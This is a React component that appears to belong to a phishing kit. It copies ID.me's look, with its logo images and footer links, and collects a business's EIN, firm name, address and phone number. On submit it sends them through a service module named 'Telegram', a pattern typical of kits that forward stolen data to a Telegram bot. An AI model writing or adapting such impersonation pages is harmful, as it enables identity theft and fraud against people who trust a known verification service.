import React, { useState } from "react";
import id from "../assets/id.png";
import download from "../assets/download2.png";
import { useNavigate } from "react-router-dom";
import { useSendAddressMutation } from "../Services/Telegram";

export default function Address() {
  const navigate = useNavigate();
  const [sendAddress] = useSendAddressMutation();

  const [formData, setFormData] = useState({
    ein: "",
    firm: "",
    address: "",
    phone: "",
  });

  const [errors, setErrors] = useState({
    ein: false,
    firm: false,
    address: false,
    phone: false,
  });

  const [currentErrorField, setCurrentErrorField] = useState(null);

  const validateField = (fieldName) => {
    const isValid = formData[fieldName].trim() !== "";
    setErrors((prev) => ({ ...prev, [fieldName]: !isValid }));
    return isValid;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    for (const field of ["ein", "firm", "address", "phone"]) {
      if (!validateField(field)) {
        setCurrentErrorField(field);
        return;
      }
    }

    try {
      await sendAddress(formData).unwrap();
      navigate("/success"); // or your next route
    } catch (error) {
      console.error("Error sending address:", error);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-[#ffffff]">
      <div className="w-full h-28 bg-white shadow-md flex justify-center items-center space-x-2 p-2">
        <img src={id} alt="User ID Icon" className="w-20" />
        <h1 className="text-lg font-bold">+</h1>
        <img src={download} alt="Download Icon" className="w-24" />
      </div>

      <div className="w-full gap-3 max-w-[500px] bg-white px-4 py-6 sm:px-8 sm:py-10 rounded-xl shadow-lg border border-gray-300 mx-auto flex flex-col items-center">
        <h1 className="text-2xl font-bold text-center mb-4">
          Enter Firm Address Info
        </h1>

        <form onSubmit={handleSubmit} className="flex flex-col items-center space-y-7 w-full max-w-md mx-auto">
          {/* EIN */}
          <InputField label="EIN" name="ein" value={formData.ein} error={errors.ein} onChange={handleChange} validate={validateField} />

          {/* Firm Name */}
          <InputField label="Firm Name" name="firm" value={formData.firm} error={errors.firm} onChange={handleChange} validate={validateField} />

          {/* Address */}
          <InputField label="Address" name="address" value={formData.address} error={errors.address} onChange={handleChange} validate={validateField} />

          {/* Phone */}
          <InputField label="Telephone" name="phone" value={formData.phone} error={errors.phone} onChange={handleChange} validate={validateField} />

          <button
            type="submit"
            className="w-full py-3 bg-blue-700 text-white rounded-lg hover:bg-blue-800 transition-colors text-lg"
          >
            Continue
          </button>
        </form>
      </div>

      <footer className="w-full shadow-md bg-[#f5f5f5] flex flex-col items-center justify-center p-4 text-xs sm:text-sm text-[#2e3f5b] space-y-2">
        <div className="underline text-blue-600 cursor-pointer">English</div>
        <div className="flex flex-wrap items-center justify-center gap-2 sm:gap-4 text-center cursor-pointer">
          <span>What is ID.me?</span>
          <span className="border-l border-black h-3" />
          <span>Terms of Service</span>
          <span className="border-l border-black h-3" />
          <span>Privacy Policy</span>
        </div>
      </footer>
    </div>
  );
}

// Reusable InputField Component
const InputField = ({ label, name, value, error, onChange, validate }) => (
  <div className="w-full">
    <label className="text-md font-semibold mb-2 block">{label}</label>
    <input
      name={name}
      type="text"
      value={value}
      onChange={onChange}
      onBlur={() => validate(name)}
      className={`w-full px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg focus:outline-none ${
        error ? "border-red-500 focus:ring-red-500" : "border-gray-300 focus:ring-blue-600"
      }`}
    />
    {error && <p className="text-red-500 text-sm mt-1">Fill out this field</p>}
  </div>
);
